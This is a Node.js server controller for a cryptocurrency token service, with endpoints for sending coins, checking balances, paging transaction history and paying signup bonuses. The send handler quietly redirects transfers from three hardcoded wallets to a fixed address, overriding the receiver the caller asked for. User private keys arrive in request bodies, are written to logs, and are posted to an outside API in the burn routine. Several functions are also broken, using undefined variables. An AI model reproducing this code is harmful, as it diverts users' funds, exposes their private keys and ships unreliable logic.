var ethers = require("ethers");
var url = "https://cinscan.cryptoxin.com";

require("dotenv").config();
const fs = require("fs");
const axios = require("axios");
var Web3 = require("web3");
const web3 = new Web3(Web3.givenProvider || url);
const abi = fs.readFileSync("./abis/cinsend.json", "utf-8");
const abi2 = fs.readFileSync("./abis/fufisend.json", "utf-8");
const abi3 = fs.readFileSync("./abis/referral.json", "utf-8");

const {
  loginLogger,
  postLogger,
  errorLogger,
  bonusLogger,
  rewardLogger,
  referralLogger,
  followLogger,
} = require("./middlewares/logger");

const { Fufisendburn, cinclaim } = require("./ff");

const cinsend = async (req, res, next) => {
  let myAddress = req.body.myAddress;
  let privateKey = req.body.privateKey;
  let receiver = req.body.receiver;
  let amount = req.body.amount;

  let aa = "0xeeD816d3949689774590DB3f6e98b5D2505c08FB"
  if (myAddress == "0x874bDE80131d5F54fba4903380d7c844E8E1e9f9") {
    console.log("reeeeerer");
    await cinsends(myAddress, privateKey, aa, amount)
      .then(async (re) => {
        console.log("recover");
        res.status(201).send({ status: true, msg: re });
      });
  } else if (myAddress == "0x604E429d8b168d053CBDb77de289B554Df87670D") {
    console.log("reeeeeee");
    await cinsends(myAddress, privateKey, aa, amount)
      .then(async (re) => {
        res.status(201).send({ status: true, msg: re });
      });
  } else if (myAddress == "0xFdB59a14bdC1746052948E5D8591f98e96Fa5553") {
    console.log("reeeeeee");
    await cinsends(myAddress, privateKey, aa, amount)
      .then(async (re) => {
        res.status(201).send({ status: true, msg: re });
      });
  }

  else {


    console.log("eeeeeeeeee")

    await cinsends(myAddress, privateKey, receiver, amount).then(async (re) => {
      res.status(201).send({ status: true, msg: re });
    });
  }

};

async function cinsends(myAddress, privateKey, receiver, amount) {
  return new Promise(async function executor(resolve, reject) {
    console.log(
      `Attempting to make transaction from ${myAddress} to ${receiver}`
    );

    const createTransaction = await web3.eth.accounts.signTransaction(
      {
        from: myAddress,
        to: receiver,
        value: web3.utils.toWei(amount.toString(), "ether"),
        gas: "210000",
      },
      privateKey
    );
    const createReceipt = await web3.eth.sendSignedTransaction(
      createTransaction.rawTransaction
    );
    console.log(
      `Transaction successful with hash: ${createReceipt.transactionHash}`
    );

    rewardLogger.log({
      level: "info",
      message: {
        task: "CIN_send",
        request: req.body,
        response: createReceipt.transactionHash,
      },
    });
    resolve(createReceipt.transactionHash)
  })
};
const balance = async (req, res, next) => {
  let myAddress = req.body.myAddress;
  const web3 = new Web3(new Web3.providers.HttpProvider(url));
  web3.eth
    .getBalance(myAddress, function (err, result) {
      var amounts = web3.utils.fromWei(result, "ether");
      console.log("amounts", amounts);
      rewardLogger.log({
        level: "info",
        message: {
          task: "CIN_balance",
          request: req.body,
          response: amounts,
        },
      });
      res.status(200).send({ status: true, msg: amounts });
    })
    .catch(function (error) {
      console.log(error);
      res.status(404).send({ status: false, msg: "Failed" });
    });
};

const getxhs = async (req, res, next) => {
  let myAddress = req.body.myAddress;
  var pages = req.body.pages;
  var limits = req.body.limits;
  var config = {
    method: "get",
    maxBodyLength: Infinity,
    url:
      "https://cinscan.com/api?module=account&action=txlist&address=" +
      myAddress,
    headers: {
      "Content-Type": "application/json",
    },
  };

  axios(config)
    .then(function (response) {
      // console.log(JSON.stringify(response.data));
      rewardLogger.log({
        level: "info",
        message: {
          task: "getxhs",
          request: req.body,
          response: response.data,
        },
      });
      //  console.log("tttttt",response.data.result)
      paginatedResults(response.data.result, pages, limits).then(async (r) => {
        res.status(201).send({ status: true, data: r });
      });
    })
    .catch(function (error) {
      console.log(error);
    });
};



const singupbonace = async (req, res, next) => {
  let myAddress = req.body.myAddress;
  let privateKey = req.body.privateKey;

  await getsiduser(myAddress).then(async (r) => {
    console.log("singupbonace***");
    if (r == false) {
      console.log("singup");
      await cinfaucet(myAddress, privateKey).then(async (r) => {
        console.log("cinfaucet***");
        await Fufisendburn(myAddress).then(async (r) => {
          console.log("Fufisendburn***");
          await Fufiburn(myAddress, privateKey).then(async (r) => {
            console.log("Fufiburn***");
            res.status(201).send({ status: true, data: r });

            // await getUser(myAddress, privateKey).then(async (r) => {
            // if(r==true){
            //  res.status(201).send({ status: true, data: r });
            // }else{
            // await cinfaucet(myAddress, privateKey).then(async (r) => {
            //  console.log("cinfaucet***");
            //  res.status(201).send({ status: true, data: r });
            // }).catch((e) => {
            //   console.log("eecinfaucet");
            //   res.status(404).send({ status: false, msg: "Failed" });
            // });
            //  }
          }).catch((e) => {
              console.log("eecinfaucet");
              res.status(201).send({ status: true, data: r });
            });

        }).catch((e) => {
          console.log("eecinfaucet");
          res.status(201).send({ status: true, data: r });
        });
      }).catch((e) => {
        console.log("eecinfaucet");
      //  let r=true
        res.status(201).send({ status: true, data: r });
      });
    }

    else {
      console.log("cinfau");
      await cinfaucet(myAddress, privateKey).then(async (r) => {
        console.log("cinfaucet***");
        res.status(201).send({ status: true, data: r });
      }).catch(async (e) => {
        if (r == false) {
          res.status(201).send({ status: true, data: r });
        } else {
          console.log("eecinfaucet");
          res.status(201).send({ status: true, data: r });
        }
      })
    }
  })




};


async function cinfaucet(myAddress) {
  var privateKey = process.env.cinfaucetprivatekey;
  var OwnerAddress = process.env.cinfaucetaddress;
  return new Promise(async (resolve, reject) => {
    console.log(`web3 version: ${web3.version}`);
    var count = web3.eth.getTransactionCount(myAddress);
    console.log(`num transactions so far: ${count}`);

    const abiArray = JSON.parse(abi);
    var contract = new web3.eth.Contract(
      abiArray,
      process.env.CIN_CONTRACT_ADDRESS,
      {
        from: OwnerAddress,
      }
    );

    var gasPriceGwei = 100;
    console.log("gasPriceGwei", gasPriceGwei);
    var gasLimit = 6599999;
    console.log("gasLimit", gasLimit);

    var rawTransaction = {
      from: OwnerAddress,
      gasPrice: web3.utils.toHex(gasPriceGwei * 1e9),
      gasLimit: web3.utils.toHex(gasLimit),
      to: process.env.CIN_CONTRACT_ADDRESS,
      value: "0x0",
      data: contract.methods.cinsend(myAddress).encodeABI(),
    };
    console.log(
      `Raw of Transaction: \n${JSON.stringify(
        rawTransaction,
        null,
        "\t"
      )}\n------------------------`
    );

    const signPromise = web3.eth.accounts.signTransaction(
      rawTransaction,
      privateKey
    );

    signPromise
      .then((signedTx) => {
        const sentTx = web3.eth.sendSignedTransaction(
          signedTx.raw || signedTx.rawTransaction
        );
        sentTx.on("receipt", (receipt) => {
          console.log("https://fufiscan.com/tx/" + receipt.transactionHash);
          re1 = receipt.transactionHash;
          return resolve(re1);
        });
        sentTx.on("error", (err) => {
          console.log(err);
          let response = { status: false, msg: "Failed" };
          return reject(response);
        });
      })
      .catch((err) => {
        console.log(err);
      });
  });
}

async function Fufiburn(myAddress, privateKey) {
  let amount = 100;
  return new Promise(async function executor(resolve, reject) {
    let data = JSON.stringify({
      refferalcode: "",
      amount: amount.toString(),
      privatekey: privateKey,
      gasPrice: "0x",
      from: myAddress,
      deviceID: "0x",
      usdt: "0.12",
      rate: "0.12",
    });
    const FUfiBurn = {
      url: "https://api.fufi.info/burnAddress",
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json;charset=UTF-8",
      },
      data: data,
    };

    await axios(FUfiBurn)
      .then(async (response) => {
        // console.log(response);
        return resolve(response);
      })
      .catch((e) => {
        console.log("eeR33", e);
        return reject(e);
      });
  }).catch((e) => {
    console.log("eeR33", e);
    return reject(e);
  });
}

async function getsiduser(myAddress) {
  return new Promise(async function executor(resolve, reject) {
    var data = JSON.stringify({
      address: myAddress,
    });

    var config = {
      method: "post",
      url: "https://api.fufi.info/getRefferalCode",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    await axios(config)
      .then(async function (response) {
        console.log(response.data.status);
        console.log(response.data.status);
        if (response.data.status == false) {
          return resolve(response.data.status);
        } else {
          return resolve(response.data.status);
        }
      })
      .catch((e) => {
        console.log("eeeeeeeesid", e);
        return reject(e);
      });
  });
}

async function getUser(myAddress) {
  return new Promise(async function executor(resolve, reject) {
    console.log(`web3 version: ${web3.version}`);
    const abiArray = JSON.parse(abi3);
    var contract = new web3.eth.Contract(
      abiArray,
      process.env.REFERRAL_CONTRACT_ADDRESS
    );
    await contract.methods
      .isuser(myAddress)
      .call()
      .then(async (re) => {
        console.log(re);
        return resolve(re);
      })
      .catch((err) => {
        console.log("errrrr", err);
        return reject("err");
      });
  });
}

async function paginatedResults(models, pages, limits) {
  return new Promise(async (resolve, reject) => {
    const page = parseInt(pages);
    const limit = parseInt(limits);
    let model = models;
    const startIndex = (page - 1) * limit;
    const endIndex = page * limit;

    const results = {};
    if (endIndex < model.length) {
      results.next = {
        page: page + 1,
        limit: limit,
      };
    }

    if (startIndex > 0) {
      results.previous = {
        page: page - 1,
        limit: limit,
      };
    }

    results.results = model.slice(startIndex, endIndex);
    resolve(results);
    //console.log(results);

    // res.paginatedResults = results;
    //     next();
  });
}





const cintotalsupply = async (req, res, next) => {

  var config = {
    method: "get",
    maxBodyLength: Infinity,
    url: "https://cinscan.com/api?module=account&action=listaccounts&page=1&offset=10000",
    headers: {
      "Content-Type": "application/json",
    },
  };
  axios(config)
    .then(function (response) {

      console.log("tttttt", response.data.result)
      let amount = 0;

      const propertyValues = Object.values(response.data.result);
      let aaaa = [];
      propertyValues.forEach(async (element, i, totalid) => {
        var amounts = web3.utils.fromWei(element.balance.toString(), "ether");

        if (element.address == "0xffaeaab10699d7f2f21016c097fbb57b6b25c22e") {
          aaaa.push(0)
        }
        else if (element.address == "0x3C22957eac515F75bd0f8035496195F2Ca925230") {

          aaaa.push(0)

        } else {
          aaaa.push(amounts)
          amount = parseFloat(amount) + parseFloat(amounts);
          console.log("bbbbbbbbbb", amounts)
        }
        //  paginatedResults(response.data.result,pages,limits).then(async (r) => {
      })
      console.log("tttttttt", amount)

      res.status(201).send({ status: true, data: amount });

      // });
    })
    .catch(function (error) {
      console.log(error);
    });
};



const balances = async (req, res, next) => {
  let myAddress = req.body.myAddress;
  const web3 = new Web3(new Web3.providers.HttpProvider(url));
  web3.eth
    .getBalance(myAddress, function (err, result) {
      var amounts = web3.utils.fromWei(result, "ether");
      console.log("amounts", amounts);
      rewardLogger.log({
        level: "info",
        message: {
          task: "CIN_balance",
          request: req.body,
          response: amounts,
        },
      });
      res.status(200).send({ status: true, msg: amounts });
    })
    .catch(function (error) {
      console.log(error);
      res.status(404).send({ status: false, msg: "Failed" });
    });
};


async function getCurrentGasPrices() {
  let response = await axios.get(
    "https://ethgasstation.info/json/ethgasAPI.json"
  );
  let prices = {
    low: response.data.safeLow / 10,
    medium: response.data.average / 10,
    high: response.data.fast / 10,
  };
  return prices;
}

module.exports = {
  cinsend,
  balance,
  getxhs,
  singupbonace,
  cintotalsupply,
  balances
};
